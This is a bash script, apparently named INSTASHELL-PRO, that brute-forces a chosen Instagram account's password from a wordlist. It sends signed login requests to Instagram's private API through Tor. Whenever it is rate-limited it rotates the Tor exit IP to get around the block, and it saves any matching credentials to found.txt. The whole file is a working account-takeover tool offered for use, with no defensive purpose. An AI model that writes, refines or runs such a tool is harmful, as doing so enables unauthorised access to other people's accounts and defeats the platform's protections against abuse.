#!/bin/bash
# INSTASHELL-PRO
# GitHub: khalidhusin786

trap 'exit 1' 2

banner() {
    clear
    printf "\e[1;92m"
    printf "  ░█─▄▀ █──█ █▀▀█ █── ─▀─ █▀▀▄ 　 ░█─░█ █──█ █▀▀ █▀▀█ ─▀─ █▀▀▄\n"
    printf "  ░█▀▄─ █▀▀█ █▄▄█ █── ▀█▀ █──█ 　 ░█▀▀█ █──█ ▀▀█ █▄▄█ ▀█▀ █──█\n"
    printf "  ░█─░█ ▀──▀ ▀──▀ ▀▀▀ ▀▀▀ ▀▀▀─ 　 ░█─░█ ─▀▀▀ ▀▀▀ ▀──▀ ▀▀▀ ▀──▀\n"
    printf "\e[1;77m\e[45m   FINAL STABLE VERSION {{Khalid Husain}}   \e[0m\n\n"
}

get_token() {
    uuid=$(openssl rand -hex 16)
    token=$(curl -s -i "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid" | grep -i "set-cookie: csrftoken=" | cut -d "=" -f2 | cut -d ";" -f1)
    echo "$token"
}

changeip() {
    printf "\e[1;91m[!] Limit hit. Refreshing Tor IP...\e[0m\n"
    killall -HUP tor 2>/dev/null
    sleep 5
}

start() {
    banner
    if ! pgrep -x "tor" > /dev/null; then
        printf "\e[1;91m[!] ERROR: Tor is not running! Run: sudo service tor start\e[0m\n"
        exit 1
    fi

    read -p $'\e[1;92mUsername account: \e[0m' user
    read -p $'\e[1;92mPassword List (Default: passwords.lst): \e[0m' wl_pass
    wl_pass="${wl_pass:-passwords.lst}"
    
    if [[ ! -f "$wl_pass" ]]; then 
        printf "\e[1;91m[!] Error: File $wl_pass not found!\e[0m\n"
        exit 1
    fi
}

bruteforcer() {
    csrftoken=$(get_token)
    [ -z "$csrftoken" ] && csrftoken="missing"

    printf "\e[1;92m[*] Target: $user | Wordlist: $wl_pass\e[0m\n\n"
    
    while IFS= read -r pass || [ -n "$pass" ]; do
        pass=$(echo "$pass" | tr -d '\r' | xargs)
        if [[ -z "$pass" ]]; then continue; fi

        guid=$(openssl rand -hex 16)
        device="android-$(openssl rand -hex 8)"
        
        data="{\"phone_id\":\"$guid\", \"_csrftoken\":\"$csrftoken\", \"username\":\"$user\", \"guid\":\"$guid\", \"device_id\":\"$device\", \"password\":\"$pass\", \"login_attempt_count\":\"0\"}"
        sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
        hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "$sig" | cut -d " " -f2)

        printf "\e[1;77mTesting: %-20s \e[0m" "$pass"

        response=$(curl --socks5-hostname 127.0.0.1:9050 -s \
            -A "Instagram 155.0.0.37.107 Android (24/7.0; Xiaomi; Redmi Note 4)" \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            -d "ig_sig_key_version=4&signed_body=$hmac.$data" \
            "https://i.instagram.com/api/v1/accounts/login/")

        if [[ $response == *"logged_in_user"* ]]; then
            printf "\e[1;92m[FOUND!]\e[0m\n"
            echo "SUCCESS: $user : $pass" >> found.txt
            exit 0
        elif [[ $response == *"challenge"* ]]; then
            printf "\e[1;93m[CHALLENGE]\e[0m\n"
            echo "CHALLENGE: $user : $pass" >> found.txt
            exit 0
        elif [[ $response == *"Please wait"* || $response == *"many tries"* ]]; then
            printf "\e[1;91m[BLOCKED]\e[0m\n"
            changeip
            csrftoken=$(get_token)
        else
            printf "\e[1;90m[WRONG]\e[0m\n"
        fi
        sleep 0.5
    done < "$wl_pass"
}

start
bruteforcer
